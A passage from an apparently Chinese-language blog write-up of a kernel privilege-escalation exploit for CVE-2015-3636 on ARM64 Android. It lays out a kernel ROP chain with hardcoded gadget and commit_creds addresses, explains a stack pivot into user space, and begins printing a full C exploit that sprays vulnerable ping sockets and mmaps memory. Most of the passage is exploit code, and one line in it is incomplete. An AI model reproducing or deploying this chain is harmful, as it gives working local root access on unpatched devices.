X5, =0xFFFFFFC0000BFAB4 \\n\\t&quot;</span>        <span class="comment">// 0xFFFFFFC0000BFAB4  commit_creds    </span></span><br><span class="line">    <span class="string">&quot;LDR     X6, =0x06060606 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X7, =0X07070707 \\n\\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     X8, =0x39 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X9, =0xffffffc00025bc94 \\n\\t&quot;</span>        <span class="comment">// 下一条指令    </span></span><br><span class="line">    <span class="string">&quot;LDR     X10, =0x10101010 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X11, =0x11111111 \\n\\t&quot;</span>                    </span><br><span class="line">    <span class="string">&quot;LDR     X12, =0x12121212 \\n\\t&quot;</span>                   </span><br><span class="line">    <span class="string">&quot;LDR     X13, =0X13131313 \\n\\t&quot;</span>                    </span><br><span class="line">    <span class="string">&quot;LDR     X14, =0x14141414 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X15, =0x15151515 \\n\\t&quot;</span>                    </span><br><span class="line">    <span class="string">&quot;LDR     X16, =0x16161616 \\n\\t&quot;</span>       <span class="comment">// </span></span><br><span class="line">    <span class="string">&quot;LDR     X17, =0xffffffc0000876a0 \\n\\t&quot;</span>        <span class="comment">// 下一条指令</span></span><br><span class="line">    <span class="string">&quot;LDR     X18, =0x18181818 \\n\\t&quot;</span>       <span class="comment">// to x19</span></span><br><span class="line">    <span class="string">&quot;LDR     X19, =0X19191919 \\n\\t&quot;</span>        <span class="comment">// to x20            </span></span><br><span class="line">    <span class="string">&quot;LDR     X20, =0x20202020 \\n\\t&quot;</span>           <span class="comment">// </span></span><br><span class="line">    <span class="string">&quot;LDR     X21, =0xFFFFFFC000084290  \\n\\t&quot;</span>            <span class="comment">// 下一条指令,直接返回用户态无法执行execve，因为内核栈不平衡了。（但是可以执行除它之外的其他系统调用）</span></span><br><span class="line">    <span class="string">&quot;LDR     X22, =0x22222222 \\n\\t&quot;</span>   </span><br><span class="line">    <span class="string">&quot;LDR     X23, =0X23232323 \\n\\t&quot;</span></span><br><span class="line">    <span class="string">&quot;LDR     X24, =0x24242424 \\n\\t&quot;</span>           <span class="comment">// to x21(pc) 0x557e31a974</span></span><br><span class="line">    <span class="string">&quot;LDR     X25, =0X25252525 \\n\\t&quot;</span>            <span class="comment">// to x22 0</span></span><br><span class="line">    <span class="string">&quot;LDR     X26, =0x26262626 \\n\\t&quot;</span>           <span class="comment">// to x23(sp) 0x557e31df00</span></span><br><span class="line">    <span class="string">&quot;LDR     X27, =0X27272727 \\n\\t&quot;</span>            <span class="comment">// to x24</span></span><br><span class="line">    <span class="string">&quot;LDR     X28, =0x28282828 \\n\\t&quot;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>第二段rop - in user</p>
<p>为什么要先在内核空间做一次栈迁移，然后才迁移到用户空间呢？</p>
<p>因为一开始需要先使用内核函数 <code>commit_creds(prapare_kernel_cred(0))</code> 为进程提权。如果在这之前往用户空间栈迁移，会导致执行这两个内核函数时，task等结构的地址计算不正确，从而系统崩溃。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">减栈操作 -&gt; 没什么gadget</span><br><span class="line"></span><br><span class="line">栈劫持到用户态空间</span><br><span class="line"></span><br><span class="line"><span class="number">1</span> hijack sp:</span><br><span class="line">hijack pc -&gt; <span class="number">0xffffffc000118458</span> : add sp, sp, #<span class="number">0x100</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">2</span> hijack sp： </span><br><span class="line"><span class="number">0xffffffc000204894</span> : mov sp, x29 ; ldp x19, x20, [sp, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line">最终目的:把x28的值（+<span class="number">0x3f20</span>）给到sp</span><br><span class="line">提前设置好x29</span><br><span class="line"></span><br><span class="line">从栈上初始化x0, x1</span><br><span class="line"><span class="number">0xffffffc0000d9384</span> : ldp x0, x1, [x29, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line">因为没有直接把x28给sp的指令，所以找一个中间寄存器</span><br><span class="line"><span class="number">0xffffffc0000f1194</span> : mov x0, x28 ; blr x1</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0002999ec</span> : add x0, x0, x19 ; ldp x19, x20, [sp, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line">放到x0寄存器后,转移到x9.【令x29+<span class="number">0x68</span> == x19+<span class="number">0x30</span>】</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0004ceab0</span> : stp x0, x1, [x19, #<span class="number">0x30</span>] ; ldp x19, x20, [sp, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0004f7138</span> : ldr x8, [x19] ; strb w9, [sp] ; ldr x9, [x29, #<span class="number">0x68</span>] ; str x9, [sp, #<span class="number">8</span>] ; ldr x8, [x8, #<span class="number">0x1b0</span>] ; blr x8</span><br><span class="line"></span><br><span class="line">x8跳到哪儿呢？</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc00009e8b8</span> : ldp x29, x30, [sp, #<span class="number">0x10</span>] ; add sp, sp, #<span class="number">0x20</span> ; ret</span><br><span class="line"></span><br><span class="line"><span class="number">0xffffffc0000d9384</span> : ldp x0, x1, [x29, #<span class="number">0x10</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br><span class="line"><span class="number">0xffffffc000132cb8</span> : mov x8, x0 ; mov x0, x8 ; ldp x29, x30, [sp], #<span class="number">0x10</span> ; ret</span><br><span class="line"></span><br><span class="line">在这条之前设置好x30，指向<span class="number">0xffffffc000084290</span>，然后执行这条指令</span><br><span class="line"><span class="number">0xffffffc000084240</span> : ldr x30, [x8] ; mov sp, x9 ; ret</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在用户态mmap空间中布置好相关内容</span></span><br><span class="line"><span class="keyword">int</span> idx_1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x0</span>] = map_addr_2;        <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x8</span>] = <span class="number">0xffffffc0000d9384</span>;        <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x10</span>] = <span class="number">0x3f20</span>;        <span class="comment">// x19  x0+x19</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x18</span>] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x20</span>] = <span class="number">0x0</span>;        <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x28</span>] = <span class="number">0xffffffc0000f1194</span>;        <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x30</span>] = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x38</span>] = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x40</span>] = <span class="number">0x0</span>;         <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x48</span>] = <span class="number">0xffffffc0004ceab0</span>;        <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x50</span>] = map_addr_2+<span class="number">0x38</span>;        <span class="comment">// x19</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x58</span>] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x60</span>] = map_addr_2;            <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x68</span>] = <span class="number">0xffffffc0004f7138</span>;            <span class="comment">//x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x70</span>] = map_addr_2;        <span class="comment">// x19</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x78</span>] = <span class="number">0x0</span>;        <span class="comment">// x20</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x80</span>] = <span class="number">0x0</span>;        <span class="comment">// dirt</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x88</span>] = <span class="number">0x0</span>;        <span class="comment">// x9 will be stored here</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x90</span>] = map_addr_3;        <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0x98</span>] = <span class="number">0xffffffc0000d9384</span>;        <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xa0</span>] = <span class="number">0x0</span>;            <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xa8</span>] = <span class="number">0xffffffc000132cb8</span>;                <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xb0</span>] = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xb8</span>] = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xc0</span>] = <span class="number">0x0</span>;        <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xc8</span>] = <span class="number">0xffffffc000084240</span>;            <span class="comment">// x30</span></span><br><span class="line">sp-&gt;(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xd0</span>] = <span class="number">0x0</span>;        </span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_1[<span class="number">0xd8</span>] = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x0</span>] = map_addr_2;            <span class="comment">// x0</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x8</span>] = <span class="number">0x0</span>;            <span class="comment">// x0</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x10</span>] = <span class="number">0x0</span>;            <span class="comment">// x0</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x18</span>] = <span class="number">0xffffffc0002999ec</span>;    <span class="comment">// x1    blr x1,(x0 +=x19)</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x20</span>] = <span class="number">0x0</span>;            <span class="comment">// x29</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x28</span>] = ;            <span class="comment">// x30</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_2[<span class="number">0x1b0</span>] = <span class="number">0xffffffc00009e8b8</span>;  <span class="comment">// ldr x8,[x8,0x1b0]</span></span><br><span class="line"></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x0</span>]  = <span class="number">0xffffffc000084290</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x8</span>]  = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x10</span>] = map_addr_3;    <span class="comment">// x0</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x18</span>] = <span class="number">0x0</span>;        <span class="comment">// x1</span></span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x20</span>] = <span class="number">0x0</span>;</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)map_addr_3[<span class="number">0x28</span>] = <span class="number">0x0</span>;</span><br></pre></td></tr></table></div></figure>


</li>
</ul>

        <h3 id="第一种exp-pipe-r-w-mutex-trylock-泄露"   >
          <a href="#第一种exp-pipe-r-w-mutex-trylock-泄露" class="heading-link"><i class="fas fa-link"></i></a><a href="#第一种exp-pipe-r-w-mutex-trylock-泄露" class="headerlink" title="第一种exp - pipe r/w + mutex_trylock()泄露"></a>第一种exp - pipe r/w + mutex_trylock()泄露</h3>
      <p>参考 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636/jni" >4B5F5F4B</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 的exp</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sysinfo.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sockios.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_SOCK_NUM 4000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_MMAP_NUM 6</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONE_MMAP_SIZE 128*1024*1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SK_STAMP_OFFSET 0x1E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCGSTAMPNS 0x8907</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEC_PER_SEC 1000000000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAGIC_VALUE 0x66666666          <span class="comment">// test before use</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vuln_sock[MAX_SOCK_NUM];</span><br><span class="line"><span class="keyword">void</span>* mmaped[MAX_MMAP_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> mmap_page_count;</span><br><span class="line"><span class="keyword">void</span>* mmap_per_page[(ONE_MMAP_SIZE/PAGE_SIZE) * MAX_MMAP_NUM];</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> vuln_sock_index;</span><br><span class="line"><span class="keyword">void</span>* vuln_page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">maximize_fd_limit</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">rlim</span>;</span></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    rlim.rlim_cur = rlim.rlim_max;</span><br><span class="line">    setrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line"></span><br><span class="line">    getrlimit(RLIMIT_NOFILE, &amp;rlim);</span><br><span class="line">    <span class="keyword">return</span> rlim.rlim_cur;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmap200200</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">void</span> *addr;</span><br><span class="line">    addr = mmap((<span class="keyword">void</span>*)<span class="number">0x200000</span>, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(addr == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to mmap 0x200200\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *(<span class="keyword">unsigned</span>*)addr = <span class="number">0x100</span>;</span><br><span class="line">    ret = mlock(addr,PAGE_SIZE);</span><br><span class="line">    <span class="keyword">if</span>(ret != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to mlock 0x200200\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create_vuln_socks</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa1</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa1,<span class="number">0x0</span>,<span class="keyword">sizeof</span>(sa1));</span><br><span class="line">    sa1.sin_family = AF_INET;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa2</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa2,<span class="number">0x0</span>,<span class="keyword">sizeof</span>(sa2));</span><br><span class="line">    